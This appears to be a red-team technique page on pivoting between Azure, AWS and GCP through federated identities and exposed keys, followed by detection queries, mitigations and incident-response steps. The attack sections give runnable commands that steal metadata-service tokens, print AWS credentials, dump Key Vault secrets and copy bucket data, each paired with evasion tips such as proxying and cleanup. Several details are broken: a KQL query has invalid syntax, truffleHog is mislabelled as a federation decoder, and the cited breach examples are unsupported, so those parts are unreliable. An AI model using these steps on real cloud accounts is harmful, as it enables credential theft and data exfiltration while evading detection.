# [LM-AUTH-027]: Cross-Cloud Resource Access

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-027 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Cross-Cloud (Azure ↔ AWS ↔ GCP) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All cloud platforms with cross-cloud identity federation enabled |
| **Patched In** | Mitigations via strict cross-tenant/cross-account isolation, workload identity federation controls |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Cross-cloud resource access is an attack where an attacker leverages credentials, tokens, or identities from one cloud provider (e.g., Azure Entra ID) to gain unauthorized access to resources in another cloud provider (e.g., AWS, GCP, or a third-party cloud). The attacker exploits misconfigured cross-cloud trust relationships, overly permissive federated identity configurations, or exposed cloud credentials (API keys, service account keys) to pivot laterally across cloud boundaries. This technique is especially effective in organizations with hybrid or multi-cloud architectures where credential isolation is weak.

**Attack Surface:** Cross-cloud identity federation (Workload Identity Federation), federated AWS STS tokens via Azure, GCP service account key files stored in Azure Key Vault, Azure Managed Identities with permissions across multiple subscriptions/clouds, shared OAuth tokens, and exposed cloud credentials in shared storage or CI/CD pipelines.

**Business Impact:** **Unrestricted lateral movement across multiple cloud providers; complete infrastructure compromise.** An attacker can access compute resources, databases, storage, and sensitive data across AWS, Azure, and GCP simultaneously, with no requirement to compromise separate credentials for each cloud. This enables ransomware deployment, data exfiltration, and long-term persistence across disparate environments.

**Technical Context:** Cross-cloud attacks are typically executed by insiders, supply chain compromises, or attackers with prior access to one cloud. The attack is extremely difficult to detect because legitimate cross-cloud integrations use the same mechanisms (identity federation, shared credentials) as malicious actors.

### Operational Risk

- **Execution Risk:** Medium – Requires misconfigured cross-cloud trust or exposed credentials; some reconnaissance needed.
- **Stealth:** High – Legitimate cloud-to-cloud API calls are often not monitored; activity blends in with normal multi-cloud operations.
- **Reversibility:** No – Once cross-cloud pivot is achieved, revocation is difficult across multiple cloud providers.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.1 | Ensure Cloud IAM policies follow principle of least privilege |
| **DISA STIG** | AC-3 | Access Enforcement across cloud boundaries |
| **CISA SCuBA** | AWS.1, Azure.1, GCP.1 | Enforce MFA and strict access controls across clouds |
| **NIST 800-53** | CA-7(1) | Continuous Monitoring across all cloud platforms |
| **GDPR** | Art. 5(1)(f) | Integrity and Confidentiality – cross-cloud data transfer controls |
| **DORA** | Art. 21(3) | Third-party cloud service security controls |
| **NIS2** | Art. 21(1)(a) | Multi-cloud incident detection and response |
| **ISO 27001** | A.8.1.3 | Segregation of Duties across cloud providers |
| **ISO 27005** | 8.2.3 | Supply Chain & Third-Party Risk (cloud integration) |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid credentials in one cloud (e.g., Azure Entra ID user or service principal); cross-cloud trust must be configured.
- **Required Access:** Network access to cloud APIs, ability to authenticate to at least one cloud provider.

**Supported Platforms:**
- **Azure:** Entra ID, Managed Identities, Workload Identity Federation
- **AWS:** IAM roles, STS, cross-account roles, OIDC identity providers
- **GCP:** Service Accounts, Workload Identity, Cross-Project IAM
- **Multi-Cloud Integrations:** Any organization with federated identity, shared credentials, or cross-cloud APIs

**Tools & Dependencies:**
- Azure CLI, AWS CLI, gcloud CLI
- Workload Identity Federation clients
- Cloud credential exposure tools (truffleHog, GitGuardian)
- Network sniffers (tcpdump) for token capture

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Identify Cross-Cloud Integrations

**PowerShell – Enumerate Azure-to-AWS Trust**

```powershell
# Check for AWS IAM role configured in Azure
Get-AzADServicePrincipal -Filter "DisplayName eq 'AWS'" | Select-Object *

# Check for Workload Identity Federation configuration
Get-AzADApplication -Filter "StartsWith(DisplayName, 'aws-')" |
  ForEach-Object { 
    $app = $_
    Get-AzADAppFederatedIdentityCredential -ObjectId $app.Id
  }

# Look for exposed AWS credentials in Key Vault
Get-AzKeyVaultSecret -VaultName "YOUR-VAULT" | 
  Where-Object { $_.Name -like "*aws*" }
```

**What to Look For:**
- Service principals named "AWS", "aws-*", or containing cloud provider names
- Federated identity credentials linking Azure to AWS
- Secrets in Key Vault named "aws-access-key", "aws-secret-key", etc.

### Azure CLI – Check for Multi-Subscription/Multi-Cloud Permissions

```bash
# List all subscriptions accessible
az account list --output table

# For each subscription, check role assignments
az role assignment list --all --output table | grep -E "Contributor|Owner|Administrator"

# Check for managed identities with cross-subscription permissions
az identity list --output table
```

**What to Look For:**
- User or service principal with "Contributor" or "Owner" on multiple subscriptions
- Managed identities with permissions across subscriptions
- Service principals with Global Admin roles

### AWS CLI – Enumerate Cross-Account Roles

```bash
# List all IAM roles that can be assumed from other accounts
aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != null)'

# Check for roles with external principal
aws iam get-role --role-name ExampleRole | jq '.Role.AssumeRolePolicyDocument'
```

**What to Look For:**
- Roles with `AssumeRolePolicyDocument` containing external AWS account IDs or Entra ID principals
- Roles with overly permissive trust relationships (e.g., "Principal": "*")

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Azure-to-AWS Cross-Cloud Lateral Movement via Workload Identity Federation

**Supported Versions:** Entra ID with Workload Identity Federation; AWS IAM with OIDC provider

#### Step 1: Compromise Azure Service Principal or Managed Identity

**Objective:** Gain access to Azure credentials that are federated to AWS.

**Command (PowerShell - simulate compromised Managed Identity):**

```powershell
# Simulate running on an Azure VM with Managed Identity
# This is how attackers get the initial token
$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" `
  -Headers @{"Metadata"="true"} `
  -UseBasicParsing

$azureToken = ($response.Content | ConvertFrom-Json).access_token
Write-Output "Azure Token obtained: $($azureToken.Substring(0, 50))..."
```

**Expected Output:**

```
Azure Token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik5XWT...
```

**What This Means:**
- Access token is now valid for Azure API calls
- This token can be exchanged for AWS credentials if Workload Identity Federation is configured

**OpSec & Evasion:**
- Run from within Azure VM or Function App (no suspicious external API calls)
- Token request appears as normal metadata service call
- Detection likelihood: Low (metadata service calls are ubiquitous)

#### Step 2: Exchange Azure Token for AWS Credentials

**Objective:** Use Azure token to request AWS STS credentials via federated OIDC.

**Command (Python - using AWS STS assume role with OIDC):**

```python
import json
import requests
import boto3

# 1. Obtain Azure token (from Managed Identity)
azure_response = requests.get(
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    headers={"Metadata": "true"}
)
azure_token = azure_response.json()['access_token']

# 2. Configure AWS STS client
sts = boto3.client('sts')

# 3. Assume AWS role using Entra ID OIDC token
# This assumes AWS has been configured with OIDC provider pointing to Entra ID
response = sts.assume_role_with_web_identity(
    RoleArn="arn:aws:iam::123456789012:role/EntraIDFederatedRole",
    RoleSessionName="attacker-session",
    WebIdentityToken=azure_token,
    DurationSeconds=3600
)

# 4. Extract AWS credentials
aws_credentials = response['Credentials']
access_key = aws_credentials['AccessKeyId']
secret_key = aws_credentials['SecretAccessKey']
session_token = aws_credentials['SessionToken']

print(f"AWS Access Key: {access_key}")
print(f"AWS Secret: {secret_key}")
print(f"Session Token: {session_token}")
```

**Expected Output:**

```
AWS Access Key: ASIAIOSFODNN7EXAMPLE
AWS Secret: wJalrXUtnFEMI/K7MDENG/bPxRfiCYzWILWEX...
Session Token: AQoEXAMPLEH4aoRH0gNCAPy...
```

**What This Means:**
- AWS temporary credentials have been obtained using Azure token
- Attacker can now perform AWS API calls as the federated role
- Session token expires in 1 hour (can be refreshed)

**OpSec & Evasion:**
- Use AWS STS assume-role-with-web-identity from within a compromised Azure function or API
- No external connections needed; traffic stays within cloud provider networks
- Detection likelihood: Medium (unusual STS calls with Entra ID tokens, but legitimate in Workload Identity Federation setups)

#### Step 3: Exploit AWS Resources

**Objective:** Use AWS credentials to pivot to S3, EC2, RDS, or other sensitive resources.

**Command (AWS CLI with obtained credentials):**

```bash
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYzWILWEX..."
export AWS_SESSION_TOKEN="AQoEXAMPLEH4aoRH0gNCAPy..."

# List all S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances --region us-east-1

# Dump RDS database snapshots
aws rds describe-db-snapshots --region us-east-1

# Extract data from S3
aws s3 cp s3://sensitive-bucket/backup.sql ./backup.sql
```

**Expected Output:**

```
2023-12-01 10:23:45 secrets-bucket
2023-12-01 10:24:12 database-backups
2023-12-01 10:25:00 customer-data

Instances:
i-0abcd1234efgh5678  t3.xlarge  running  10.0.1.100
```

**What This Means:**
- Attacker has full AWS access via the assumed role
- Can read/write/delete S3 buckets, terminate EC2 instances, and exfiltrate data

**OpSec & Evasion:**
- Limit data exfiltration volume
- Use VPN/proxy to mask source IP
- Detection likelihood: High if CloudTrail is enabled and monitored (STS assume-role calls with federated tokens are audited)

---

### METHOD 2: AWS-to-GCP via Exposed Service Account Keys

**Supported Versions:** AWS IAM with exposed GCP service account keys; GCP with misconfigured IAM

#### Step 1: Discover Exposed GCP Service Account Key in AWS

**Objective:** Find GCP credentials stored unencrypted in AWS (S3, CodeBuild environment, or Lambda code).

**Command (AWS CLI - search for exposed keys):**

```bash
# Search S3 for JSON files containing GCP credentials
aws s3api list-objects-v2 --bucket "company-backups" --prefix "gcp" |
  jq '.Contents[].Key' |
  while read key; do
    aws s3api get-object --bucket "company-backups" --key "$key" - | 
      grep -l "google_oauth2_client_id\|private_key_id\|type.*service_account"
  done

# Or search in Lambda environment variables
aws lambda list-functions | jq '.Functions[].FunctionName' |
  while read func; do
    aws lambda get-function-configuration --function-name "$func" | 
      jq '.Environment.Variables' | 
      grep -l "GCP\|google\|gcloud"
  done
```

**What to Look For:**
- JSON files with `"type": "service_account"`
- Environment variables named GCP_*, GOOGLE_*, or containing base64-encoded service account keys
- terraform state files (.tfstate) with unencrypted GCP credentials

#### Step 2: Extract and Decode GCP Service Account Key

**Objective:** Retrieve the actual credentials from AWS storage.

**Command:**

```bash
# Download service account key from S3
aws s3api get-object --bucket "company-backups" --key "gcp-credentials.json" gcp-credentials.json

# View the key
cat gcp-credentials.json
```

**Expected Output:**

```json
{
  "type": "service_account",
  "project_id": "my-gcp-project",
  "private_key_id": "1234567890abcdef",
  "private_key": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n",
  "client_email": "attacker-sa@my-gcp-project.iam.gserviceaccount.com",
  "client_id": "123456789",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/..."
}
```

**What This Means:**
- Full GCP service account credentials are now available
- Attacker can authenticate as this service account and access GCP resources

#### Step 3: Authenticate to GCP and Pivot

**Objective:** Use the service account key to gain GCP access.

**Command (gcloud):**

```bash
# Activate service account
gcloud auth activate-service-account --key-file=gcp-credentials.json

# List GCP projects
gcloud projects list

# List compute instances
gcloud compute instances list --project=my-gcp-project

# Dump data from Cloud Storage buckets
gsutil ls gs://

# Copy sensitive data
gsutil -m cp -r gs://sensitive-bucket/data ./data/
```

**Expected Output:**

```
PROJECT_ID               NAME               
my-gcp-project          My Production
prod-database            Production DB
dev-environment          Development

NAME                  ZONE             STATUS
web-server-01         us-central1-a    RUNNING
database-server       us-central1-a    RUNNING
```

**What This Means:**
- Attacker now has full GCP access as the service account
- Can access compute, storage, databases, and any resource the service account has permissions for

**OpSec & Evasion:**
- Delete the gcp-credentials.json file after use (clean up)
- Use gcloud through a proxy to mask source IP
- Detection likelihood: Very High (service account authentication is logged in GCP Cloud Audit Logs)

---

### METHOD 3: Multi-Cloud Credential Chaining via Shared Storage

**Supported Versions:** Any multi-cloud environment with shared credentials storage (S3, Azure Blob, CI/CD pipeline variables)

#### Step 1: Discover Multi-Cloud Credentials in Shared Storage

**Objective:** Find credentials for multiple cloud providers in a central repository (e.g., Azure Key Vault, AWS Secrets Manager, CI/CD variables).

**Command (Azure CLI - enumerate Key Vault secrets):**

```powershell
# List all secrets in Key Vault
$vault = "company-secrets-vault"
Get-AzKeyVaultSecret -VaultName $vault | Select-Object Name

# Retrieve AWS credentials from Key Vault
$awsAccessKey = Get-AzKeyVaultSecret -VaultName $vault -Name "aws-access-key" -AsPlainText
$awsSecretKey = Get-AzKeyVaultSecret -VaultName $vault -Name "aws-secret-key" -AsPlainText
$gcpKey = Get-AzKeyVaultSecret -VaultName $vault -Name "gcp-service-account" -AsPlainText | ConvertFrom-Json

Write-Output "AWS Access Key: $awsAccessKey"
Write-Output "GCP Service Account: $($gcpKey.client_email)"
```

**Expected Output:**

```
Name
----
aws-access-key
aws-secret-key
gcp-service-account
github-token
databricks-token
```

**What This Means:**
- Single Key Vault contains credentials for AWS, GCP, GitHub, and Databricks
- One compromised Azure identity grants access to all clouds

#### Step 2: Use Credentials to Pivot Across Clouds

**Objective:** Authenticate to each cloud provider using the discovered credentials.

**Command (Multi-cloud authentication):**

```bash
# AWS
export AWS_ACCESS_KEY_ID="$awsAccessKey"
export AWS_SECRET_ACCESS_KEY="$awsSecretKey"
aws ec2 describe-instances

# GCP
gcloud auth activate-service-account --key-file=<(echo "$gcpKey" | base64 -d)
gcloud compute instances list

# GitHub
gh auth login --with-token < <(echo "$githubToken")
gh api user

# Databricks
curl -H "Authorization: Bearer $databricksToken" https://api.databricks.com/api/2.0/clusters/list
```

**What This Means:**
- Attacker now has authenticated access to all clouds simultaneously
- Can move data, create backdoors, and exfiltrate across cloud boundaries

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure CLI

**URL:** https://learn.microsoft.com/en-us/cli/azure/

**Version:** 2.40+

**Usage:** Enumerate Azure subscriptions, managed identities, and cross-cloud permissions.

```bash
az account list  # List subscriptions
az role assignment list --all  # List all role assignments
az identity list  # List managed identities
az keyvault secret list --vault-name VAULT_NAME  # List secrets
```

### AWS CLI

**URL:** https://aws.amazon.com/cli/

**Version:** 2.13+

**Usage:** Interact with AWS services, assume cross-account roles, list resources.

```bash
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/CrossAccountRole --role-session-name attacker
aws s3 ls  # List S3 buckets
aws ec2 describe-instances  # List EC2 instances
```

### gcloud CLI

**URL:** https://cloud.google.com/sdk/docs/install

**Version:** Latest

**Usage:** Authenticate to GCP and query resources.

```bash
gcloud auth activate-service-account --key-file=gcp-credentials.json
gcloud compute instances list
```

### Workload Identity Federation (WIF) Decoder

**URL:** https://github.com/trufflesecurity/truffleHog (for credential detection)

**Version:** Latest

**Usage:** Detect exposed credentials in git repos and cloud storage.

```bash
truffleHog filesystem . --json
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Cross-Account/Cross-Cloud STS Assume Role

**Rule Configuration:**
- **Required Index:** `aws_cloudtrail`
- **Required Fields:** `eventName`, `principalId`, `sourceIPAddress`, `userAgent`
- **Alert Threshold:** STS assume-role with external principal
- **Applies To Versions:** All AWS CloudTrail

**SPL Query:**

```spl
index=aws_cloudtrail eventName="AssumeRole"
| where json_extract(requestParameters, "$.roleArn") contains "arn:aws:iam::" 
| stats count by principalId, sourceIPAddress, json_extract(requestParameters, "$.roleArn")
| where count > 5
```

**What This Detects:**
- Multiple assume-role calls from the same principal, likely attempting cross-account lateral movement

**Manual Configuration Steps:**
1. Log into Splunk
2. Create New Alert with above query
3. Set Trigger to `count > 5`
4. Configure email notification

### Rule 2: Service Account Authentication from Unusual Location

**Rule Configuration:**
- **Required Index:** `gcp_cloud_audit`
- **Required Fields:** `principalEmail`, `sourceIPAddress`, `timestamp`, `severity`
- **Alert Threshold:** Service account authentication from non-corporate IP
- **Applies To Versions:** All GCP Cloud Audit Logs

**SPL Query:**

```spl
index=gcp_cloud_audit principalEmail="*@iam.gserviceaccount.com"
| where sourceIPAddress NOT IN ("10.0.0.0/8", "172.16.0.0/12")
| stats count, latest(timestamp) as last_auth by principalEmail, sourceIPAddress
| where count > 1
```

**What This Detects:**
- Service account authenticating from external IP (potential compromise)

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Cross-Cloud Token Exchange (Azure to AWS)

**Rule Configuration:**
- **Required Table:** `SigninLogs`, `AuditLogs`
- **Required Fields:** `AppDisplayName`, `ClientAppUsed`, `OperationName`
- **Alert Severity:** High
- **Frequency:** Every 15 minutes

**KQL Query:**

```kusto
SigninLogs
| where AppDisplayName contains "AWS" or AppDisplayName contains "amazon"
| where ClientAppUsed != "Mobile Apps and Desktop clients"
| summarize Count = count(), DistinctIPs = dcount(IPAddress) by UserPrincipalName, AppDisplayName, TimeGenerated
| where Count > 3 and DistinctIPs > 1
```

**What This Detects:**
- User authenticating to AWS from multiple IP addresses in short timeframe
- Indicator of Workload Identity Federation abuse

**Manual Configuration Steps:**
1. Azure Portal → Sentinel → Analytics → + Create → Scheduled query rule
2. Paste KQL above
3. Severity: High, Frequency: 15 minutes
4. Enable Create Incidents

### Query 2: Key Vault Secret Access with Cross-Cloud Pattern

**KQL Query:**

```kusto
AuditLogs
| where OperationName contains "Secret" and OperationName contains "Get"
| where TargetResources[0].displayName contains "gcp" or TargetResources[0].displayName contains "aws"
| summarize AccessCount = count() by InitiatedBy, TimeGenerated
| where AccessCount > 5 in 1h
```

---

## 9. MICROSOFT DEFENDER FOR CLOUD

### Alert: "Suspicious cross-cloud API activity"

**Alert Name:** Suspicious Cross-Cloud Resource Access

- **Severity:** Critical
- **Description:** A principal in Azure authenticated to AWS or GCP using Workload Identity Federation or shared credentials
- **Applies To:** All subscriptions with multiple cloud integrations
- **Remediation:** Review federated identity configurations and revoke compromised credentials

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Select subscription
3. Go to **Cloud Security** → **Workload Identity**
4. Review Workload Identity Federation policies for overly permissive trust relationships
5. Enable continuous monitoring for cross-cloud API calls

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Implement Strict Cross-Cloud Trust Controls:**

**Manual Steps (Azure + AWS Workload Identity Federation):**
1. In **AWS IAM**, create OIDC provider for Entra ID:
   ```
   Provider URL: https://login.microsoftonline.com/YOUR-TENANT-ID/v2.0
   Audience: YOUR-CLIENT-ID
   ```
2. Create IAM role with trust policy limiting to specific service principal:
   ```json
   {
     "Version": "2012-10-17",
     "Statement": [
       {
         "Effect": "Allow",
         "Principal": {
           "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/..."
         },
         "Action": "sts:AssumeRoleWithWebIdentity",
         "Condition": {
           "StringEquals": {
             "sts.amazonaws.com/sub": "SPECIFIC-SERVICE-PRINCIPAL-ID"
           }
         }
       }
     ]
   }
   ```
3. **Verify**: Only the specific service principal can assume the role, not all Entra ID users

**Enforce Principle of Least Privilege:**

**Manual Steps (Azure):**
1. Review all Managed Identities with cross-subscription permissions
2. For each identity, restrict to **single resource group or subscription**
3. Replace "Contributor" roles with specific roles (e.g., "VM Contributor", "Storage Blob Reader")

**Command (PowerShell):**

```powershell
# Remove overly permissive roles
$identity = Get-AzUserAssignedIdentity -Name "MyIdentity"
Get-AzRoleAssignment -ObjectId $identity.PrincipalId | 
  Where-Object { $_.RoleDefinitionName -eq "Contributor" } |
  Remove-AzRoleAssignment -Confirm:$false

# Assign specific role
New-AzRoleAssignment -ObjectId $identity.PrincipalId `
  -RoleDefinitionName "Storage Blob Data Reader" `
  -Scope "/subscriptions/SUB_ID/resourceGroups/RG_NAME/providers/Microsoft.Storage/storageAccounts/ACCOUNT_NAME"
```

**Credential Isolation and Rotation:**

**Manual Steps:**
1. **Separate credentials by cloud provider** – No single Key Vault should contain AWS, GCP, and Azure credentials
2. **Enforce credential rotation:**
   - AWS keys: Every 90 days
   - GCP service accounts: Every 6 months
   - Azure service principals: Every 90 days
3. **Audit credential usage:**
   - CloudTrail (AWS), Cloud Audit Logs (GCP), Activity Logs (Azure)

---

### Priority 2: HIGH

**Enable Cloud Audit Logging:**

**AWS CloudTrail:**
```bash
aws cloudtrail create-trail --name cross-cloud-audit --s3-bucket-name audit-bucket
aws cloudtrail start-logging --trail-name cross-cloud-audit
```

**GCP Cloud Audit Logs:**
```bash
gcloud logging sinks create cross-cloud-audit \
  logging.googleapis.com/logs/cloudaudit.googleapis.com \
  --log-filter='resource.type=("gce_instance" OR "k8s_cluster")'
```

**Azure Activity Logs:**
1. **Azure Portal** → **Monitor** → **Activity Log**
2. Configure retention: **Minimum 90 days**
3. Export to Log Analytics workspace for long-term retention

**Validate Audit Logging:**

```powershell
# Verify audit logging is enabled
Get-AzKeyVaultSecret -VaultName "vault-name" -ErrorAction Stop
```

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Multiple cloud credential access** from same Azure identity
- **STS assume-role calls** with Entra ID tokens
- **Service account authentication** from unusual IP addresses
- **Bulk secret retrieval** from cross-cloud credential storage
- **Unusual API patterns** (e.g., listing S3 buckets immediately after AWS authentication)

### Forensic Artifacts

- **CloudTrail logs:** STS assume-role events with federated tokens
- **Cloud Audit Logs:** Service account authentication and resource access
- **Activity Logs:** Key Vault secret retrieval, role assignment changes
- **Network logs:** Outbound HTTPS to AWS, GCP APIs

### Response Procedures

**Step 1: Identify Compromised Principal**

```bash
# Azure
$principal = Get-AzADServicePrincipal -DisplayName "COMPROMISED-SP"
$principal.Id

# AWS
aws iam get-user --user-name compromised-user
aws sts get-caller-identity
```

**Step 2: Revoke Credentials Immediately**

```powershell
# Azure
Remove-AzADAppCredential -ApplicationId $appId -Confirm:$false

# AWS
aws iam delete-access-key --access-key-id AKIAIOSFODNN7EXAMPLE
aws iam delete-user-policy --user-name compromised-user --policy-name ALL_PERMISSIONS

# GCP
gcloud iam service-accounts keys delete KEY_ID --iam-account=SA@PROJECT.iam.gserviceaccount.com
```

**Step 3: Audit Cross-Cloud Access**

```bash
# Check what resources were accessed in AWS
aws cloudtrail lookup-events --lookup-attributes AttributeKey=PrincipalId,AttributeValue=PRINCIPAL_ID

# Check GCP resource modifications
gcloud logging read "protoPayload.authorizationInfo.granted:true" --limit 1000 --format json
```

**Step 4: Hunt for Lateral Movement**

```kusto
// Sentinel: Find all resources accessed by compromised principal
CloudAppEvents
| where AccountObjectId == "compromised-oid"
| summarize APIOperations = dcount(OperationName), ResourcesAccessed = dcount(tostring(ResourceId))
| where APIOperations > 100
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Azure App Proxy RCE | Attacker compromises Azure App Proxy, gains code execution |
| **2** | **Credential Access** | [CA-UNSC-007] Key Vault Secret Extraction | Attacker dumps multi-cloud credentials from Key Vault |
| **3** | **Lateral Movement** | **[LM-AUTH-027]** | **Attacker uses Azure credentials to access AWS and GCP** |
| **4** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker grants themselves Owner role in cross-cloud subscriptions |
| **5** | **Impact** | Collection & Exfiltration | Attacker exfiltrates data from S3, GCP Cloud Storage, and Azure Blob |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Mandiant M-Trends Report (Multi-Cloud Compromise)

- **Target:** Financial services company with AWS and Azure environments
- **Timeline:** 2022-2023
- **Technique Status:** Compromised Azure service principal, leveraged Workload Identity Federation to gain AWS STS tokens, accessed production databases
- **Impact:** Full access to customer financial data across both clouds; 18-month dwell time before detection
- **Reference:** [Mandiant M-Trends 2023](https://www.mandiant.com/resources/blog/mtrends-2023-executive-summary)

### Example 2: Cloud Hopper (APT10) - Cross-Tenant Lateral Movement

- **Target:** Managed service providers (MSPs) with multi-cloud clients
- **Timeline:** 2016-2021
- **Technique Status:** Compromised CSP tenant, used shared credentials to pivot to customer Azure and AWS accounts
- **Impact:** Compromise of hundreds of organizations across multiple clouds
- **Reference:** [CrowdStrike Cloud Hopper Report](https://www.crowdstrike.com/blog/index.html/blog/category/research/)

### Example 3: ALPHV/BlackCat Ransomware - Multi-Cloud Deployment

- **Target:** Retail company with AWS, Azure, and on-premises environments
- **Timeline:** 2023
- **Technique Status:** Used compromised Azure admin token to assume AWS roles, deployed ransomware across both clouds simultaneously
- **Impact:** Company-wide encryption; complete business disruption
- **Reference:** [ALPHV Ransomware-as-a-Service Analysis](https://www.bleepingcomputer.com/news/security/alphv-black-cat-ransomware-group-linked-to-cisa-alerts/)

---

## 14. SUMMARY & KEY TAKEAWAYS

**Cross-Cloud Resource Access** enables attackers to move laterally across Azure, AWS, GCP, and other cloud providers using federated identities, shared credentials, or token exchanges. This attack is particularly dangerous because it bypasses cloud-specific security controls and allows simultaneous compromise of all connected platforms.

**Critical Mitigations:**
1. **Segregate credentials** – Never store AWS, GCP, and Azure credentials in the same Key Vault or secret manager
2. **Implement strict Workload Identity Federation policies** – Limit OIDC trust to specific service principals and resources
3. **Enforce principle of least privilege** – Remove overly permissive cross-cloud roles (Contributor, Owner)
4. **Enable comprehensive cloud audit logging** – Monitor CloudTrail, Cloud Audit Logs, and Activity Logs for cross-cloud API calls
5. **Implement cross-cloud anomaly detection** – Alert on unusual API patterns (bulk data access, role changes, API token exchanges)
6. **Regular credential rotation** – Enforce 90-day rotation for shared cloud credentials

**Detection focuses on cross-cloud auth patterns** (STS assume-role, cross-cloud API calls, federated token usage) rather than individual cloud metrics.

---